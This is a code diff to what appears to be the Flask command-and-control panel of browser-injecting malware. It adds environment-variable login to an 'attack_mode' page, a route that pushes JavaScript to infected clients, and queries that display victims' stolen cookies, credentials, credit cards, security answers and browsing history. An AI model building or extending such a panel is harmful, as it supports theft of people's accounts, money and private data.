@@ -7,6 +7,7 @@ from . import database, app
 from .app import app as app_flask, socketio
 from flask_socketio import SocketIO, emit
 import json
+import os
 
 
 login_manager = LoginManager()
@@ -36,7 +37,8 @@ def login():
     error = None
 
     if form.validate_on_submit():
-        if request.form['username'] =='admin' and request.form['password'] == 'admin':
+        if(request.form['username'] == os.environ.get('SEANON_USER') and request.form['password'] == os.environ.get('SEANON_PASS')):
+        # if(request.form['username']=='admin' and request.form['password']=='admin'):
             user = User("admin")
             login_user(user)
             return redirect(url_for('attack_mode'))
@@ -83,6 +85,8 @@ def sendFormIDMappings():
 @app_flask.route('/sendjs', methods=['POST'])
 @login_required
 def sendjs():
+    t='6666'
+    socketio.emit('newClientInstall', t)
     a = request.form['js']
     b = request.form['id']
     z = request.form['pattern']
@@ -114,7 +118,7 @@ def getinfo():
     with conn.cursor() as cur:
         cur.execute('SELECT * FROM Client WHERE ID = (%s)', (userid,))
         record = cur.fetchone()
-        cur.execute('SELECT * FROM Cookies WHERE CID = (%s)', (userid,))
+        cur.execute('SELECT * FROM Cookies WHERE ClientID = (%s)', (userid,))
         cookies = cur.fetchall()
         cur.execute('SELECT * FROM Credentials WHERE CID = (%s)', (userid,))
         credentials = cur.fetchall()
@@ -154,9 +158,10 @@ def getinfo():
     # browser_history = database.get_history(userid)
     # with open(browser_history) as bh:
     #     head = [next(bh) for x in range(10)]
-
+    # history = open('hist.txt').read().split('\n')
+    history = database.get_history(userid).split('\n')
     return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
-                           creditcards=creditcards, questions=questions, history = sites_in_html, fullbh = fullbh, forms = forms,
+                           creditcards=creditcards, questions=questions, history = history, fullbh = fullbh, forms = forms,
                            keys = keys, values = values, mappings =mappings,
                             urls = form_urls)
 
